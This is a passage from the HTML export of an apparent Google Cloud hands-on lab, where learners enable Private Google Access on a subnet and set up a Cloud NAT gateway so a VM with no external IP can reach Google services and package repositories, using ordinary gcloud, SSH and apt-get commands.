0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud storage cp gs://$MY_BUCKET/*.svg .</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>This should work because Cloud Shell has an external IP address!</span></p><ol start='2' ><li><p><span>To connect to </span><strong><span>vm-internal</span></strong><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud compute ssh vm-internal --zone ZONE --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='3' ><li><p><span>If prompted, type </span><strong><span>Y</span></strong><span> to continue.</span></p></li><li><p><span>Store the name of your bucket in an environment variable:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> export MY_BUCKET=[enter your bucket name here]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='5' ><li><p><span>Verify it with echo:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> echo $MY_BUCKET</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='6' ><li><p><span>Try to copy the image to </span><strong><span>vm-internal</span></strong><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud storage cp gs://$MY_BUCKET/*.svg .</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>This should not work: </span><strong><span>vm-internal</span></strong><span> can only send traffic within the VPC network because Private Google Access is disabled (by default).</span></p><ol start='7' ><li><p><span>Press </span><strong><span>Ctrl+Z</span></strong><span> to stop the request.</span></p></li></ol><p>&nbsp;</p><p><span>Enable Private Google Access</span></p><p><span>Private Google Access is enabled at the subnet level. When it is enabled, instances in the subnet that only have private IP addresses can send traffic to Google APIs and services through the default route (0.0.0.0/0) with a next hop to the default internet gateway.</span></p><ol start='' ><li><p><span>In the Cloud Console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>VPC network &gt; VPC networks</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>privatenet</span></strong><span> to open the network.</span></p></li><li><p><span>Click </span><strong><span>Subnets</span></strong><span>, and then click </span><strong><span>privatenet-us</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Edit</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Private Google access</span></strong><span>, select </span><strong><span>On</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create a Cloud Storage bucket and Enable Private Google Access</span></p><p><strong><span>Note:</span></strong><span> Enabling Private Google Access is as simple as selecting </span><strong><span>On</span></strong><span> within the subnet!</span></p><ol start='7' ><li><p><span>Run the following command, in </span><strong><span>Cloud Shell</span></strong><span> for </span><strong><span>vm-internal</span></strong><span>, to try to copy the image to </span><strong><span>vm-internal</span></strong><span>.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud storage cp gs://$MY_BUCKET/*.svg .</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>This should work because </span><strong><span>vm-internal</span></strong><span>&#39;s subnet has </span><strong><span>Private Google Access</span></strong><span> enabled!</span></p><ol start='8' ><li><p><span>To return to your Cloud Shell instance, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='9' ><li><p><span>Again type exit if needed to return to your Cloud Shell instance.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> To view the eligible APIs and services that you can use with Private Google Access, see supported services in the </span><a href='https://cloud.google.com/vpc/docs/private-access-options#pga-supported'><span>Private access options for services Guide</span></a><span>.</span></p><p>&nbsp;</p><h4 id='task-3-configure-a-cloud-nat-gateway'><span>Task 3. Configure a Cloud NAT gateway</span></h4><p><span>Although </span><strong><span>vm-internal</span></strong><span> can now access certain Google APIs and services without an external IP address, the instance cannot access the internet for updates and patches. Configure a Cloud NAT gateway, which allows </span><strong><span>vm-internal</span></strong><span> to reach the internet.</span></p><p><span>Try to update the VM instances</span></p><ol start='' ><li><p><span>In </span><strong><span>Cloud Shell</span></strong><span>, to try to re-synchronize the package index, run the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> sudo apt-get update</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>The output should finish like this (</span><strong><span>example output</span></strong><span>):</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ...</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Reading package lists... Done</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>This should work because </span><strong><span>Cloud Shell</span></strong><span> has an external IP address!</span></p><ol start='2' ><li><p><span>To connect to </span><strong><span>vm-internal</span></strong><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud compute ssh vm-internal --zone ZONE --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='3' ><li><p><span>If prompted, type </span><strong><span>Y</span></strong><span> to continue.</span></p></li><li><p><span>To try to re-synchronize the package index of </span><strong><span>vm-internal</span></strong><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> sudo apt-get update</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>This should only work for Google Cloud packages because </span><strong><span>vm-internal</span></strong><span> only has access to Google APIs and services!</span></p><ol start='5' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop the request.</span></p></li></ol><p><span>Configure a Cloud NAT gateway</span></p><p><span>Cloud NAT is a regional resource. You can configure it to allow traffic from all ranges of all subnets in a region, from specific subnets in the region only, or from specific primary and secondary CIDR ranges only.</span></p><p>&nbsp;</p><ol start='' ><li><p><span>On the Google Cloud console title bar, type </span><strong><span>Network services</span></strong><span> in the </span><strong><span>Search</span></strong><span>field, then click </span><strong><span>Network services</span></strong><span> in the </span><strong><span>Products &amp; Page</span></strong><span> section.</span></p></li><li><p><span>On the </span><strong><span>Network service</span></strong><span> page, click </span><strong><span>Pin</span></strong><span> next to Network services.</span></p></li><li><p><span>Click </span><strong><span>Cloud NAT</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Get started</span></strong><span> to configure a NAT gateway.</span></p></li><li><p><span>Specify the following:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Gateway name</span></td><td style='text-align:left;' ><span>nat-config</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>privatenet</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>REGION</code></td></tr></tbody></table></figure><ol start='6' ><li><p><span>For </span><strong><span>Cloud Router</span></strong><span>, select </span><strong><span>Create new router</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><span>nat-router</span></strong></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> The NAT mapping section allows you to choose the subnets to map to the NAT gateway. You can also manually assign static IP addresses that should be used when performing NAT. Do not change the NAT mapping configuration in this lab.</span></p><ol start='9' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the gateway&#39;s status to change to </span><strong><span>Running</span></strong><span>.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Configure a Cloud NAT gateway</span></p><p>&nbsp;</p><p><span>Verify the Cloud NAT gateway</span></p><p><span>It may take up to 3 minutes for the NAT configuration to propagate to the VM, so wait at least a minute before trying to access the internet again.</span></p><p>&nbsp;</p><ol start='' ><li><p><span>In </span><strong><span>Cloud Shell</span></strong><span> for </span><strong><span>vm-internal</span></strong><span>, to try to re-synchronize the package index of </span><strong><span>vm-internal</span></strong><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> sudo apt-get update</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>The output should finish like this (</span><strong><span>example output</span></strong><span>):</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ...</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Reading package lists... Done</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>This should work because </span><strong><span>vm-internal</span></strong><span> is using the NAT gateway!</span></p><ol start='2' ><li><p><span>To return to your Cloud Shell instance, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" 